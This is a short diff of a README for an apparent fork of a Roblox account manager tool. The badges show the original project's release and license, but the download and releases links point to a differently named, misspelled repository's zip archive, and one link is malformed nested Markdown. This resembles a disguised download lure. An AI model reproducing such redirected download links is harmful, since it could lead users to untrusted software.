@@ -1,5 +1,5 @@
 [![Download](https://img.shields.io/github/v/release/ic3w0lf22/Roblox-Account-Manager)](https://github.com/LxslyS2/Roblox-Account-Profile-Managament/archive/refs/heads/main.zip)
-[![Latest Downloads](https://img.shields.io/github/downloads/LxslyS2/Roblox-Account-Manager/latest/total)](https://github.com/LxslyS2/Roblox-Account-Manager/releases)
+[![Latest Downloads](https://img.shields.io/github/downloads/LxslyS2/Roblox-Account-Manager/latest/total)]([https://github.com/LxslyS2/Roblox-Account-Manager/releases](https://github.com/LxslyS2/Roblox-Account-Profile-Managament/releases))
 [![Discord](https://img.shields.io/discord/871845273800957982?label=Discord)](https://discord.gg/MsEHfr7smXY8)
 ![License](https://img.shields.io/github/license/ic3w0lf22/Roblox-Account-Manager)
 
